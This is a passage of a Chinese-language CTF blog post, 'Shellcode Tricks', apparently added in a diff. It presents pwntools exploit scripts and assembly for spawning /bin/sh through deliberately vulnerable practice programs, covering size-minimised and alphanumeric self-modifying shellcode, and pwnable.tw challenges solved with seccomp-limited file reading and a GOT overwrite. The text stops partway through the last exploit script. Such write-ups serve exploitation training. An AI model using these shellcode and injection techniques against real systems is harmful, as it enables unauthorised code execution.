@@ -1,0 +1,1530 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="Software Security Researcher">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>Shellcode Tricks - AssassinQ</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Saturday, March 2nd 2019, 7:05 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    5.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      31 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>The Splendid Shellcode.</p>
+<a id="more"></a>
+<p>Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。</p>
+<ul>
+<li>可以控制程序执行流，可以控制一定的 data；</li>
+<li>利用 <code>mprotect()</code> 或者 <code>_dl_make_stack_executable()</code> 改写某些区域的 porc 再执行。</li>
+</ul>
+<p>关于 System Call：</p>
+<pre><code class="cpp">sys_execve( const char *filename, char *const argv[], char *const envp[] );
+</code></pre>
+<p>目标：</p>
+<pre><code class="cpp">execve(&quot;/bin/sh&quot;, 0, 0);
+</code></pre>
+<p>System Call x86：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">eax</th>
+<th style="text-align:center">ebx</th>
+<th style="text-align:center">ecx</th>
+<th style="text-align:center">edx</th>
+<th style="text-align:center">else</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0xb</td>
+<td style="text-align:center">addr of “/bin/sh”</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">int 0x80</td>
+</tr>
+</tbody>
+</table>
+<p>System Call x64：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">rax</th>
+<th style="text-align:center">rdi</th>
+<th style="text-align:center">rsi</th>
+<th style="text-align:center">rdx</th>
+<th style="text-align:center">else</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">59</td>
+<td style="text-align:center">addr of “/bin/sh”</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">syscall</td>
+</tr>
+</tbody>
+</table>
+<h1 id="Basic-Shellcode"><a href="#Basic-Shellcode" class="headerlink" title="Basic Shellcode"></a>Basic Shellcode</h1><p>最基础的 shellcode，对输入的长度没有做严格限制。</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>Source Code：</p>
+<pre><code class="c">// gcc main.c -m32 -z execstack -o main
+#include &lt;stdio.h&gt;
+int main() {
+    void (*ptr)();
+    char buf[0x20];
+    puts(&quot;shellcode&gt;&gt;&quot;);
+    read(0, buf, 0x20);
+    ptr = buf;
+    ptr();
+}
+</code></pre>
+<p>push 字符串<code>&quot;/bin/sh&quot;</code>，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。<code>&quot;/bin/sh&quot;</code>的值可以在 gdb 调试中<code>searchmem /bin/sh</code>得到。Shellcode 的长度为 29。</p>
+<p>Exploit：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+p = process(&#39;./main&#39;)
+context.arch = &#39;i386&#39;
+sh = asm(&#39;&#39;&#39;
+    mov eax, 0xb
+    mov ecx, 0
+    mov edx, 0
+    push 0x68732f
+    push 0x6e69622f
+    mov ebx, esp
+    int 0x80
+&#39;&#39;&#39;)
+info(disasm(sh))
+info(len(sh))
+# gdb.attach(p)
+p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x20))
+p.interactive()
+</code></pre>
+<h2 id="shellcode64"><a href="#shellcode64" class="headerlink" title="shellcode64"></a>shellcode64</h2><p>Source Code：</p>
+<pre><code class="c">// gcc main.c -z execstack -o main
+#include &lt;stdio.h&gt;
+int main() {
+    void (*ptr)();
+    char buf[0x40];
+    puts(&quot;shellcode&gt;&gt;&quot;);
+    read(0, buf, 0x40);
+    ptr = buf;
+    ptr();
+}
+</code></pre>
+<p>64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37</p>
+<p>Exploit：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+p = process(&#39;./main&#39;)
+context.arch = &#39;amd64&#39;
+sh = asm(&#39;&#39;&#39;
+    mov rax, 59
+    mov rsi, 0
+    mov rdx, 0
+    mov rdi, 0x68732f6e69622f
+    push rdi
+    mov rdi, rsp
+    syscall
+&#39;&#39;&#39;)
+info(disasm(sh))
+info(len(sh))
+# gdb.attach(p)
+p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x40))
+p.interactive()
+</code></pre>
+<h1 id="Baby-Shellcode"><a href="#Baby-Shellcode" class="headerlink" title="Baby Shellcode"></a>Baby Shellcode</h1><p>对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。</p>
+<h2 id="shellcode-20"><a href="#shellcode-20" class="headerlink" title="shellcode_20"></a>shellcode_20</h2><p>Source Code：</p>
+<pre><code class="c">// gcc main.c -m32 -z execstack -o main
+#include &lt;stdio.h&gt;
+int main() {
+    void (*ptr)();
+    char buf[0x20];
+    puts(&quot;shellcode&gt;&gt;&quot;);
+    read(0, buf, 20);
+    ptr = buf;
+    ptr();
+}
+</code></pre>
+<p>32 位下，<code>mov ecx, 0</code> 是 5 个字节，而 <code>xor ecx, ecx</code> 只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。<code>mov eax, 0xb</code> 同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要 <code>mov al, 0xb</code>，只需要 2 个字节。<code>mul ebx</code> 需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。执行 shellcode 时寄存器的状态：</p>
+<pre><code>─────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────
+ EAX  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* &#39;fer&#39; */
+ EBX  0x0
+ ECX  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* &#39;fer&#39; */
+ EDX  0x14
+ EDI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0xffffd718 ◂— 0x0
+ ESP  0xffffd6dc —▸ 0x80484d5 (main+74) ◂— mov    eax, 0
+ EIP  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* &#39;fer&#39; */
+───────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────
+ ► 0xffffd6ec    push   eax
+   0xffffd6ed    or     ah, dl
+   0xffffd6ef    test   dword ptr [ecx], 0
+   0xffffd6f5    add    byte ptr [eax], al
+   0xffffd6f7    add    byte ptr [eax + 0x1a], dl
+    ↓
+   0xffffd6f7    add    byte ptr [eax + 0x1a], dl
+</code></pre><p>Exploit：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+p = process(&#39;./main&#39;)
+context.arch = &#39;i386&#39;
+sh = asm(&#39;&#39;&#39;
+    mul ebx
+    mov al, 0xb
+    xor ecx, ecx
+    push 0x0068732f
+    push 0x6e69622f
+    mov ebx, esp
+    int 0x80
+&#39;&#39;&#39;)
+info(disasm(sh))
+info(len(sh))
+gdb.attach(p)
+p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x20, &#39;\x00&#39;))
+p.interactive()
+</code></pre>
+<p>还有一种就是构造 <code>read</code>，读入 shellcode，可以直接缩短到 8 个字节：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+p = process(&#39;./main&#39;)
+context.arch = &#39;i386&#39;
+sh = asm(&#39;&#39;&#39;
+    mul ebx
+    mov al, 0x3
+    mov dl, 0x90
+    int 0x80
+&#39;&#39;&#39;)
+info(disasm(sh))
+info(len(sh))
+gdb.attach(p)
+p.sendlineafter(&#39;shellcode&gt;&gt;\n&#39;, sh)
+payload = &#39;\x90&#39; * 0x20 + asm(shellcraft.sh())
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="shellcode64-22"><a href="#shellcode64-22" class="headerlink" title="shellcode64_22"></a>shellcode64_22</h2><p>Source Code：</p>
+<pre><code class="c">// gcc main.c -z execstack -o main
+#include &lt;stdio.h&gt;
+int main() {
+    void (*ptr)();
+    char buf[0x40];
+    puts(&quot;shellcode&gt;&gt;&quot;);
+    read(0, buf, 22);
+    ptr = buf;
+    ptr();
+}
+</code></pre>
+<p>调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的 <code>mov rax, 59</code> 缩短为 2 个字节的 <code>mov al, 59</code>。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即 <code>push rbx ; pop rsi</code> 只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。执行 shellcode 时寄存器的状态：</p>
+<pre><code>─────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────
+ RAX  0x0
+ RBX  0x0
+ RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
+ RDX  0x7fffffffe590 ◂— 0xa50 /* &#39;P\n&#39; */
+ RDI  0x0
+ RSI  0x7fffffffe590 ◂— 0xa50 /* &#39;P\n&#39; */
+ R8   0x602000 ◂— 0x0
+ R9   0xd
+ R10  0x37b
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffe6c0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffe5e0 —▸ 0x400640 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffe578 —▸ 0x400625 (main+79) ◂— mov    eax, 0
+ RIP  0x7fffffffe590 ◂— 0xa50 /* &#39;P\n&#39; */
+───────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────
+ ► 0x7fffffffe590    push   rax
+   0x7fffffffe591    or     al, byte ptr [rax]
+   0x7fffffffe593    add    byte ptr [rax], al
+   0x7fffffffe595    add    byte ptr [rax], al
+   0x7fffffffe597    add    byte ptr [rax], al
+   0x7fffffffe599    add    byte ptr [rax], al
+   0x7fffffffe59b    add    byte ptr [rax], al
+   0x7fffffffe59d    add    byte ptr [rax], al
+   0x7fffffffe59f    add    byte ptr [rcx], al
+   0x7fffffffe5a1    add    byte ptr [rax], al
+   0x7fffffffe5a3    add    byte ptr [rax], al
+</code></pre><p>Exploit：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+p = process(&#39;./main&#39;)
+context.arch = &#39;amd64&#39;
+sh = asm(&#39;&#39;&#39;
+    mov al, 59
+    push rbx
+    push rbx
+    pop rsi
+    pop rdx
+    mov rdi, 0x68732f6e69622f
+    push rdi
+    push rsp
+    pop rdi
+    syscall
+&#39;&#39;&#39;)
+info(disasm(sh))
+info(len(sh))
+gdb.attach(p)
+p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x40))
+p.interactive()
+</code></pre>
+<p>构造 <code>read</code> 最短可以修改为 7 字节：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+p = process(&#39;./main&#39;)
+context.arch = &#39;amd64&#39;
+sh = asm(&#39;&#39;&#39;
+    xor rdx, rdx
+    mov dl, 0x90
+    syscall
+&#39;&#39;&#39;)
+info(disasm(sh))
+info(len(sh))
+gdb.attach(p)
+p.sendlineafter(&#39;shellcode&gt;&gt;\n&#39;, sh)
+payload = &#39;\x90&#39; * 0x20 + asm(shellcraft.sh())
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="Alphanumeric-Shellcode"><a href="#Alphanumeric-Shellcode" class="headerlink" title="Alphanumeric Shellcode"></a>Alphanumeric Shellcode</h1><p>用上面 32 位的程序作为例子，输入长度不做限制，使用数字和字母来编写 shellcode。可以尝试看看大概有哪些能用的指令：</p>
+<pre><code class="txt">a   61                      popa
+b   62 41 42                bound  eax,QWORD PTR [ecx+0x42]
+c   63 41 42                arpl   WORD PTR [ecx+0x42],ax
+d   64 41                   fs inc ecx
+e   65 41                   gs inc ecx
+f   66 41                   inc    cx
+g   67 41                   addr16 inc ecx
+h   68 41 42 43 44          push   0x44434241
+i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443
+j   6a 41                   push   0x41
+k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43
+...
+p   70 41                   jo     0x43
+q   71 41                   jno    0x43
+r   72 41                   jb     0x43
+s   73 41                   jae    0x43
+t   74 41                   je     0x43
+u   75 41                   jne    0x43
+v   76 41                   jbe    0x43
+w   77 41                   ja     0x43
+x   78 41                   js     0x43
+y   79 41                   jns    0x43
+z   7a 41                   jp     0x43
+A   41                      inc    ecx
+B   42                      inc    edx
+C   43                      inc    ebx
+D   44                      inc    esp
+E   45                      inc    ebp
+F   46                      inc    esi
+G   47                      inc    edi
+H   48                      dec    eax
+I   49                      dec    ecx
+J   4a                      dec    edx
+K   4b                      dec    ebx
+L   4c                      dec    esp
+M   4d                      dec    ebp
+N   4e                      dec    esi
+O   4f                      dec    edi
+P   50                      push   eax
+Q   51                      push   ecx
+R   52                      push   edx
+S   53                      push   ebx
+T   54                      push   esp
+U   55                      push   ebp
+V   56                      push   esi
+W   57                      push   edi
+X   58                      pop    eax
+Y   59                      pop    ecx
+Z   5a                      pop    edx
+0   30 41 42                xor    BYTE PTR [ecx+0x42],al
+1   31 41 42                xor    DWORD PTR [ecx+0x42],eax
+2   32 41 42                xor    al,BYTE PTR [ecx+0x42]
+3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]
+4   34 41                   xor    al,0x41
+5   35 41 42 43 44          xor    eax,0x44434241
+...
+</code></pre>
+<p>其中 <code>pop ebx</code> 是没有的，但是可以采用 <code>push</code> 系列的指令和 <code>popa</code> 来赋值。还有关键的一点是 <code>int 0x80</code> 并不存在，也需要使用一些 tricks。这里可以看到有异或的指令，如果控制了 <code>ecx</code>（将 shellcode 的地址赋给 <code>ecx</code>）和 <code>al</code>，就可以对指定部分的 shellcode 实现自修改。这里的情况是 shellcode 被读到栈上，可以通过 <code>inc</code> 和 <code>dec</code> 调整 <code>esp</code> 的位置，然后 <code>pop</code> 给 <code>ecx</code>。一般来说采用构造 <code>sys_read</code> 的方式来读入 <code>sys_execve</code> 的 shellcode 覆盖（自修改）原本的 shellcode。</p>
+<p>原理大概如上，具体实现经过调试后才会更加熟悉，脚本：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]
+
+p = process(&#39;./main&#39;)
+
+#gdb.attach(p)
+
+sh = (
+    &#39;DDDDDDDDDDDDDDDDDDDDY&#39; + # pop ecx
+    &#39;jDX4DH0AA&#39; + # 0xff ^ ord(&#39;2&#39;) =&gt; 0xcd
+    &#39;jDX4DH4K0AB&#39; + # 0xff ^ ord(&#39;9&#39;) ^ ord(&#39;F&#39;) =&gt; 0x80
+    &#39;jDX4D&#39; + # set eax=0
+    &#39;PQPPPPPPa&#39; + # set ebx
+    &#39;jzZ&#39; + # set edx=90
+    &#39;j7X44&#39; # set eax=3
+).ljust(0x41, &#39;P&#39;) + &#39;24&#39;
+
+print disasm(sh)
+print len(sh)
+p.sendlineafter(&#39;shellcode&gt;\n&#39;, sh)
+
+#raw_input(&#39;@&#39;)
+p.sendline(&#39;\x90&#39; * 70 + asm(shellcraft.sh()))
+
+p.interactive()
+</code></pre>
+<h1 id="Child-Shellcode"><a href="#Child-Shellcode" class="headerlink" title="Child Shellcode"></a>Child Shellcode</h1><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>题目一开始 seccomp 设置了白名单，根据提示也可以知道只能使用 open、read、write 三个调用来读取 <code>/home/orw/flag</code>。然后可以输入长 0xC8 的 shellcode 执行：</p>
+<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf(&quot;Give my your shellcode:&quot;);
+  read(0, &amp;shellcode, 0xC8u);
+  ((void (*)(void))shellcode)();
+  return 0;
+}
+</code></pre>
+<p>写个汇编实现读取并输出的操作：</p>
+<pre><code class="nasm">BITS 32
+
+_start:
+    sub esp, 200
+    mov dword [esp], 0x6d6f682f
+    mov dword [esp + 4], 0x726f2f65
+    mov dword [esp + 8], 0x6c662f77
+    mov dword [esp + 12], 0x6761
+
+_open:
+    mov eax, 5
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+
+_read:
+    mov ebx, eax
+    mov eax, 3
+    mov ecx, esp
+    mov edx, 100
+    int 0x80
+
+_write:
+    mov ebx, 1
+    mov ecx, esp
+    mov edx, eax
+    mov eax, 4
+    int 0x80
+
+_exit:
+    add esp, 200
+    ret
+</code></pre>
+<p>用 nasm 编译后获取 flag：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+r = remote(&#39;chall.pwnable.tw&#39;, 10001)
+
+sh = open(&#39;sh&#39;, &#39;rb&#39;).read()
+r.recvuntil(&#39;Give my your shellcode:&#39;)
+r.sendline(sh)
+
+r.interactive()
+</code></pre>
+<h2 id="Death-Note"><a href="#Death-Note" class="headerlink" title="Death Note"></a>Death Note</h2><p>程序没有开启 NX，可以跑 shellcode。程序是给了四个选项，增加、删除、查看 Note，以及退出程序：</p>
+<pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int c; // eax
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 2, 0);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      c = read_int();
+      if ( c != 2 )
+        break;
+      show_note();
+    }
+    if ( c &gt; 2 )
+    {
+      if ( c == 3 )
+      {
+        del_note();
+      }
+      else
+      {
+        if ( c == 4 )
+          exit(0);
+LABEL_13:
+        puts(&quot;Invalid choice&quot;);
+      }
+    }
+    else
+    {
+      if ( c != 1 )
+        goto LABEL_13;
+      add_note();
+    }
+  }
+}
+</code></pre>
+<p>其中在 <code>read_int</code> 函数中发现用了 <code>atoi</code>，可以输入负数：</p>
+<pre><code class="cpp">int read_int()
+{
+  char buf; // [esp+Ch] [ebp-1Ch]
+  unsigned int v2; // [esp+1Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  if ( read(0, &amp;buf, 0xFu) &gt; 0 )
+    return atoi(&amp;buf);
+  puts(&quot;read error&quot;);
+  exit(1);
+  return atoi(&amp;buf);
+}
+</code></pre>
+<p>漏洞主要在 <code>add_note</code> 中，输入 idx 的时候只判断了不能大于 10，说明可以输入负数，那就可以读到 bss 上的其他部分，可以指向 GOT。接下来在输入了 Name 之后，会判断输入的字符串是否都是可打印字符：</p>
+<pre><code class="cpp">unsigned int add_note()
+{
+  int idx; // [esp+8h] [ebp-60h]
+  char s; // [esp+Ch] [ebp-5Ch]
+  unsigned int v3; // [esp+5Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  printf(&quot;Index :&quot;);
+  idx = read_int();
+  if ( idx &gt; 10 )
+  {
+    puts(&quot;Out of bound !!&quot;);
+    exit(0);
+  }
+  printf(&quot;Name :&quot;);
+  read_input(&amp;s, 0x50u);
+  if ( !is_printable(&amp;s) )
+  {
+    puts(&quot;It must be a printable name !&quot;);
+    exit(-1);
+  }
+  note[idx] = strdup(&amp;s);
+  puts(&quot;Done !&quot;);
+  return __readgsdword(0x14u) ^ v3;
+}
+</code></pre>
+<p>其中 <code>is_printable</code> 函数如下：</p>
+<pre><code class="cpp">int __cdecl is_printable(char *s)
+{
+  size_t i; // [esp+Ch] [ebp-Ch]
+
+  for ( i = 0; strlen(s) &gt; i; ++i )
+  {
+    if ( s[i] &lt;= 0x1F || s[i] == 0x7F )
+      return 0;
+  }
+  return 1;
+}
+</code></pre>
+<p>看完 <code>add_note</code> 基本上就有思路了，先是获取 <code>note</code> 到 <code>puts@got</code> 之间的偏移，作为 idx 输入。然后构造一个 shellcode 读入，相当于把 <code>puts@got</code> 改成了 shellcode，这样在 <code>strdup(&amp;s)</code> 之后就改好了 <code>puts@got</code>，在下一条语句调用 <code>puts</code> 的时候跑 shellcode。这里比 alphanumeric 的条件宽松些，大部分可用的指令如下：</p>
+<pre><code class="txt">...
+(   28 41 42                sub    BYTE PTR [ecx+0x42],al
+)   29 41 42                sub    DWORD PTR [ecx+0x42],eax
+*   2a 41 42                sub    al,BYTE PTR [ecx+0x42]
++   2b 41 42                sub    eax,DWORD PTR [ecx+0x42]
+,   2c 41                   sub    al,0x41
+-   2d 41 42 43 44          sub    eax,0x44434241
+...
+0   30 41 42                xor    BYTE PTR [ecx+0x42],al
+1   31 41 42                xor    DWORD PTR [ecx+0x42],eax
+2   32 41 42                xor    al,BYTE PTR [ecx+0x42]
+3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]
+4   34 41                   xor    al,0x41
+5   35 41 42 43 44          xor    eax,0x44434241
+...
+@   40                      inc    eax
+A   41                      inc    ecx
+B   42                      inc    edx
+C   43                      inc    ebx
+D   44                      inc    esp
+E   45                      inc    ebp
+F   46                      inc    esi
+G   47                      inc    edi
+H   48                      dec    eax
+I   49                      dec    ecx
+J   4a                      dec    edx
+K   4b                      dec    ebx
+L   4c                      dec    esp
+M   4d                      dec    ebp
+N   4e                      dec    esi
+O   4f                      dec    edi
+P   50                      push   eax
+Q   51                      push   ecx
+R   52                      push   edx
+S   53                      push   ebx
+T   54                      push   esp
+U   55                      push   ebp
+V   56                      push   esi
+W   57                      push   edi
+X   58                      pop    eax
+Y   59                      pop    ecx
+Z   5a                      pop    edx
+[   5b                      pop    ebx
+\   5c                      pop    esp
+]   5d                      pop    ebp
+^   5e                      pop    esi
+_   5f                      pop    edi
+`   60                      pusha
+a   61                      popa
+...
+h   68 41 42 43 44          push   0x44434241
+i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443
+k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43
+...
+p   70 41                   jo     0x43
+q   71 41                   jno    0x43
+r   72 41                   jb     0x43
+s   73 41                   jae    0x43
+t   74 41                   je     0x43
+u   75 41                   jne    0x43
+v   76 41                   jbe    0x43
+w   77 41                   ja     0x43
+x   78 41                   js     0x43
+y   79 41                   jns    0x43
+z   7a 41                   jp     0x43
+{   7b 41                   jnp    0x43
+|   7c 41                   jl     0x43
+}   7d 41                   jge    0x43
+~   7e 41                   jle    0x43
+</code></pre>
+<p>这里有 <code>sub</code> 指令，可以通过溢出多次减法来得到想要的字节：</p>
+<pre><code class="python">x = 0x80 # 0xcd
+t = 0
+while True:
+    x = (x + 0x50) &amp; 0xFF
+    t += 1
+    if x &gt;= 0x20 and x &lt; 0x7F:
+        print t
+        print hex(x)
+        break
+</code></pre>
+<p>简单地调试一下，看到执行 shellcode 的时候，四个通用寄存器这里 <code>edx</code> 指向了输入的 shellcode，这样的话之后会方便很多：</p>
+<pre><code>─────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────
+ EAX  0xfffffff0
+ EBX  0x0
+ ECX  0x0
+ EDX  0x8b33008 ◂— 0x58 /* &#39;X&#39; */
+ EDI  0xf7753000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf7753000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0xfff18ac8 —▸ 0xfff18ad8 ◂— 0x0
+ ESP  0xfff18a4c —▸ 0x80487f4 (add_note+165) ◂— add    esp, 0x10
+ EIP  0x80484c0 (puts@plt) ◂— jmp    dword ptr [0x804a020]
+──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
+ ► 0x80484c0 &lt;puts@plt&gt;    jmp    dword ptr [0x804a020]
+    ↓
+   0x8b33008               pop    eax
+   0x8b33009               add    byte ptr [eax], al
+   0x8b3300b               add    byte ptr [eax], al
+   0x8b3300d               add    byte ptr [eax], al
+   0x8b3300f               add    byte ptr [eax], al
+   0x8b33011               add    byte ptr [eax], al
+   0x8b33013               add    cl, dh
+   0x8b33015               lar    eax, word ptr [eax]
+   0x8b33018               add    byte ptr [eax], al
+   0x8b3301a               add    byte ptr [eax], al
+</code></pre><p>脚本：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+local = 0
+if local:
+    p = process(&#39;./death_note&#39;)
+else:
+    p = remote(&#39;chall.pwnable.tw&#39;, 10201)
+
+elf = ELF(&#39;./death_note&#39;)
+
+def cmd(c):
+    p.recvuntil(&#39;choice :&#39;)
+    p.sendline(str(c))
+
+def add(idx, name):
+    cmd(1)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;Name :&#39;)
+    p.sendline(name)
+
+def show(idx):
+    cmd(2)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(idx))
+
+def delete(idx):
+    cmd(3)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(idx))
+
+def quit():
+    cmd(4)
+
+note = 0x0804A060
+offset = (elf.got[&#39;puts&#39;] - note) / 4
+
+sh = (
+    &#39;RY&#39; + # push edx &amp;&amp; pop ecx
